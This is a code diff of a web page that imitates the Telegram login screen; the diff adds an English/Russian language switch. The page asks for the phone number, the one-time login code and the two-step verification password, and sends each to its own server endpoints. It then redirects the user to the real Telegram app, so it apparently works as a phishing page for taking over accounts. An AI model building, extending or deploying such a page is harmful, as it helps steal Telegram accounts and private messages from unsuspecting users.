@@ -7,7 +7,6 @@
     <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg viewBox='0 0 240 240' xmlns='http://www.w3.org/2000/svg'%3E%3Ccircle cx='120' cy='120' r='120' fill='%233390ec'/%3E%3Cpath fill='%23ffffff' d='M54.2 118.4l135.6-52.3c6.3-2.4 11.8 1.5 9.6 10.7l-23.1 108.8c-1.7 7.9-6.6 9.8-13.3 6.1l-36.8-27.1-17.7 17c-2 2-3.6 3.6-7.3 3.6l2.6-37.4 68.2-61.6c3-2.6-1.3-4.1-4.6-1.5l-84.3 53.1-36.4-11.4c-7.9-2.5-8.1-7.9 1.5-10z'/%3E%3C/svg%3E">
 
     <style>
-        /* ... (все стили остаются без изменений) ... */
         :root { --color-primary: #3390ec; --color-text: #000; --color-text-secondary: #707579; --color-borders: #dadce0; --color-background: #fff; --font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: var(--font-family); -webkit-tap-highlight-color: transparent; }
         body { background-color: var(--color-background); display: flex; justify-content: center; align-items: center; min-height: 100vh; color: var(--color-text); }
@@ -51,22 +50,28 @@
         .auth-button.primary:hover { background-color: #2b7fcf; }
         .auth-button:disabled { opacity: 0.6; cursor: not-allowed; }
         #code-input { text-align: center; letter-spacing: 4px; font-size: 24px; }
+        
+        /* Кнопка переключения языка */
+        .lang-switch { position: absolute; top: 20px; right: 20px; background: transparent; border: 1px solid var(--color-borders); border-radius: 8px; padding: 6px 12px; cursor: pointer; font-size: 14px; color: var(--color-text-secondary); transition: 0.2s; }
+        .lang-switch:hover { background: #f4f4f4; color: var(--color-text); }
     </style>
 </head>
 <body>
+
+<button class="lang-switch" onclick="toggleLanguage()" id="lang-btn">EN</button>
 
 <!-- ЭКРАН 1: Ввод номера -->
 <div class="auth-form active" id="screen-phone">
     <div id="logo-tg"></div>
     <h1>Telegram</h1>
-    <p class="note">Проверьте код страны и введите свой номер телефона.</p>
+    <p class="note" data-i18n="phone_note">Проверьте код страны и введите свой номер телефона.</p>
 
     <form class="form" onsubmit="event.preventDefault(); submitPhone();">
         
         <div class="DropdownMenu" id="country-dropdown">
             <div class="input-group touched" onclick="toggleDropdown()">
                 <input class="form-control" type="text" id="selected-country" readonly value="Россия">
-                <label>Страна</label>
+                <label data-i18n="label_country">Страна</label>
                 <i class="css-icon-down"></i>
             </div>
             
@@ -77,15 +82,15 @@
 
         <div class="input-group">
             <input class="form-control" type="tel" id="phone-number" placeholder="+7" value="+7" required>
-            <label>Номер телефона</label>
+            <label data-i18n="label_phone">Номер телефона</label>
         </div>
 
         <label class="Checkbox">
             <input type="checkbox" id="keep-session" checked>
-            <div class="Checkbox-main"><span class="label">Запомнить меня</span></div>
+            <div class="Checkbox-main"><span class="label" data-i18n="label_remember">Запомнить меня</span></div>
         </label>
 
-        <button type="submit" id="submit-btn" class="auth-button primary">ВОЙТИ</button>
+        <button type="submit" id="submit-btn" class="auth-button primary" data-i18n="btn_login">ВОЙТИ</button>
     </form>
 </div>
 
@@ -95,33 +100,34 @@
         <tgs-player autoplay loop mode="normal" src="monkey.tgs" style="width: 120px; height: 120px;"></tgs-player>
     </div>
     <div class="phone-display" id="display-phone">+7 987 703 2133</div>
-    <p class="note">Мы отправили код в приложение Telegram на<br>другом Вашем устройстве.</p>
+    <p class="note" data-i18n="code_note">Мы отправили код в приложение Telegram на<br>другом Вашем устройстве.</p>
 
     <form class="form" onsubmit="event.preventDefault(); submitCode();">
         <div class="input-group">
             <input class="form-control" type="text" id="code-input" placeholder="" required autocomplete="one-time-code">
-            <label>Код</label>
+            <label data-i18n="label_code">Код</label>
         </div>
-        <button type="submit" id="verify-btn" class="auth-button primary">ПОДТВЕРДИТЬ</button>
+        <button type="submit" id="verify-btn" class="auth-button primary" data-i18n="btn_confirm">ПОДТВЕРДИТЬ</button>
     </form>
 </div>
 
 <!-- ЭКРАН 3: Ввод пароля -->
 <div class="auth-form" id="screen-password">
     <img src="https://web.telegram.org/a/img-apple-160/1f648.png" class="avatar-img" alt="Monkey Password">
-    <h1>Введите пароль</h1>
-    <p class="note">У вас включена двухэтапная проверка, поэтому ваш аккаунт защищен дополнительным паролем.</p>
+    <h1 data-i18n="password_title">Введите пароль</h1>
+    <p class="note" data-i18n="password_note">У вас включена двухэтапная проверка, поэтому ваш аккаунт защищен дополнительным паролем.</p>
 
     <form class="form" onsubmit="event.preventDefault(); submitPassword();">
         <div class="input-group password-wrapper">
-            <input class="form-control" type="password" id="password-input" placeholder="Пароль" required>
+            <input class="form-control" type="password" id="password-input" placeholder="" required data-i18n-placeholder="placeholder_password">
+            <label data-i18n="label_password">Пароль</label>
             <div class="password-toggle" onclick="togglePassword()">
                 <svg viewBox="0 0 24 24" width="20" height="20">
                     <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
                 </svg>
             </div>
         </div>
-        <button type="submit" id="password-btn" class="auth-button primary" style="margin-top: 20px;">ПОДТВЕРДИТЬ</button>
+        <button type="submit" id="password-btn" class="auth-button primary" style="margin-top: 20px;" data-i18n="btn_confirm">ПОДТВЕРДИТЬ</button>
     </form>
 </div>
 
@@ -131,11 +137,114 @@
 
 <script>
     // ==========================================
-    // ЛОГИКА РАБОТЫ
+    // СЛОВАРИ ПЕРЕВОДОВ
+    // ==========================================
+    const translations = {
+        ru: {
+            phone_note: "Проверьте код страны и введите свой номер телефона.",
+            label_country: "Страна",
+            label_phone: "Номер телефона",
+            label_remember: "Запомнить меня",
+            btn_login: "ВОЙТИ",
+            code_note: "Мы отправили код в приложение Telegram на<br>другом Вашем устройстве.",
+            label_code: "Код",
+            btn_confirm: "ПОДТВЕРДИТЬ",
+            password_title: "Введите пароль",
+            password_note: "У вас включена двухэтапная проверка, поэтому ваш аккаунт защищен дополнительным паролем.",
+            label_password: "Пароль",
+            placeholder_password: "Пароль",
+            alert_phone: "Введите корректный номер.",
+            btn_sending: "ОТПРАВКА...",
+            alert_code: "Введите код.",
+            btn_checking: "ПРОВЕРКА...",
+            alert_wrong_code: "Неверный код или он истек.",
+            alert_password: "Введите пароль.",
+            alert_wrong_password: "Ошибка проверки пароля.",
+            alert_connection: "Ошибка соединения с сервером."
+        },
+        en: {
+            phone_note: "Please confirm your country code and enter your phone number.",
+            label_country: "Country",
+            label_phone: "Phone number",
+            label_remember: "Keep me signed in",
+            btn_login: "NEXT",
+            code_note: "We've sent the code to the Telegram app<br>on your other device.",
+            label_code: "Code",
+            btn_confirm: "CONFIRM",
+            password_title: "Enter your password",
+            password_note: "Your account is protected with an additional password (Two-Step Verification).",
+            label_password: "Password",
+            placeholder_password: "Password",
+            alert_phone: "Please enter a valid phone number.",
+            btn_sending: "SENDING...",
+            alert_code: "Please enter the code.",
+            btn_checking: "CHECKING...",
+            alert_wrong_code: "Invalid code or it has expired.",
+            alert_password: "Please enter a password.",
+            alert_wrong_password: "Invalid password.",
+            alert_connection: "Connection error."
+        }
+    };
+
+    // ==========================================
+    // ОПРЕДЕЛЕНИЕ ЯЗЫКА И ЛОГИКА ПЕРЕКЛЮЧЕНИЯ
+    // ==========================================
+    let currentLang = 'ru'; // База
+
+    // 1. Проверяем сохраненный выбор
+    let savedLang = localStorage.getItem('lang');
+
+    if (savedLang) {
+        currentLang = savedLang;
+    } else {
+        // 2. Если нет сохранения — смотрим браузер
+        let browserLang = navigator.language || navigator.userLanguage;
+        if (browserLang.toLowerCase().startsWith('en')) {
+            currentLang = 'en';
+        } else {
+            currentLang = 'ru';
+        }
+    }
+
+    function changeLanguage(lang) {
+        currentLang = lang;
+        localStorage.setItem('lang', lang); // Запоминаем выбор пользователя
+        document.getElementById('lang-btn').innerText = lang === 'ru' ? 'EN' : 'RU';
+        
+        // Меняем тексты
+        document.querySelectorAll('[data-i18n]').forEach(el => {
+            const key = el.getAttribute('data-i18n');
+            if (translations[lang][key]) {
+                el.innerHTML = translations[lang][key];
+            }
+        });
+
+        // Меняем плейсхолдеры (подсказки в полях)
+        document.querySelectorAll('[data-i18n-placeholder]').forEach(el => {
+            const key = el.getAttribute('data-i18n-placeholder');
+            if (translations[lang][key]) {
+                el.placeholder = translations[lang][key];
+            }
+        });
+    }
+
+    function toggleLanguage() {
+        changeLanguage(currentLang === 'ru' ? 'en' : 'ru');
+    }
+
+    // Функция для получения текста
+    function t(key) {
+        return translations[currentLang][key];
+    }
+
+    // Применяем язык сразу при загрузке страницы
+    changeLanguage(currentLang);
+
+    // ==========================================
+    // ОСНОВНАЯ ЛОГИКА РАБОТЫ
     // ==========================================
     const countryListContainer = document.getElementById('country-list');
 
-    // Проверяем, загрузился ли список стран
     if (typeof countriesList !== 'undefined' && countryListContainer) {
         countriesList.forEach(country => {
             const div = document.createElement('div');
@@ -187,9 +296,9 @@
         const submitBtn = document.getElementById('submit-btn');
         let phone = phoneInput.value.replace(/[^\d+]/g, '');
         
-        if (phone.length < 10) { alert("Введите корректный номер."); return; }
+        if (phone.length < 10) { alert(t('alert_phone')); return; }
         submitBtn.disabled = true;
-        submitBtn.innerText = "ОТПРАВКА...";
+        submitBtn.innerText = t('btn_sending');
 
         try {
             let response = await fetch('/api/send_code', {
@@ -206,10 +315,10 @@
                 showScreen('screen-code');
                 document.getElementById('code-input').focus();
             } else {
-                alert("Ошибка: " + (data.error || "Неизвестная ошибка"));
+                alert("Error: " + (data.error || "Unknown error"));
             }
-        } catch (error) { alert("Ошибка соединения с сервером."); } 
-        finally { submitBtn.disabled = false; submitBtn.innerText = "ВОЙТИ"; }
+        } catch (error) { alert(t('alert_connection')); } 
+        finally { submitBtn.disabled = false; submitBtn.innerText = t('btn_login'); }
     }
 
     async function submitCode() {
@@ -217,9 +326,9 @@
         const verifyBtn = document.getElementById('verify-btn');
         const code = codeInput.value.trim();
 
-        if (!code) { alert("Введите код."); return; }
+        if (!code) { alert(t('alert_code')); return; }
         verifyBtn.disabled = true;
-        verifyBtn.innerText = "ПРОВЕРКА...";
+        verifyBtn.innerText = t('btn_checking');
 
         try {
             let response = await fetch('/api/verify_code', {
@@ -233,11 +342,11 @@
                 showScreen('screen-password');
                 document.getElementById('password-input').focus();
             } else {
-                alert("Неверный код или он истек.");
+                alert(t('alert_wrong_code'));
                 codeInput.value = "";
             }
-        } catch (error) { alert("Ошибка соединения с сервером."); } 
-        finally { verifyBtn.disabled = false; verifyBtn.innerText = "ПОДТВЕРДИТЬ"; }
+        } catch (error) { alert(t('alert_connection')); } 
+        finally { verifyBtn.disabled = false; verifyBtn.innerText = t('btn_confirm'); }
     }
 
     async function submitPassword() {
@@ -245,9 +354,9 @@
         const passwordBtn = document.getElementById('password-btn');
         const password = passwordInput.value;
 
-        if (!password) { alert("Введите пароль."); return; }
+        if (!password) { alert(t('alert_password')); return; }
         passwordBtn.disabled = true;
-        passwordBtn.innerText = "ПРОВЕРКА...";
+        passwordBtn.innerText = t('btn_checking');
 
         try {
             let response = await fetch('/api/verify_password', {
@@ -260,10 +369,10 @@
             if (data.success) {
                 window.location.href = "tg://resolve?domain=telegram";
             } else {
-                alert("Ошибка проверки пароля.");
+                alert(t('alert_wrong_password'));
             }
-        } catch (error) { alert("Ошибка соединения с сервером."); } 
-        finally { passwordBtn.disabled = false; passwordBtn.innerText = "ПОДТВЕРДИТЬ"; }
+        } catch (error) { alert(t('alert_connection')); } 
+        finally { passwordBtn.disabled = false; passwordBtn.innerText = t('btn_confirm'); }
     }
 </script>
 
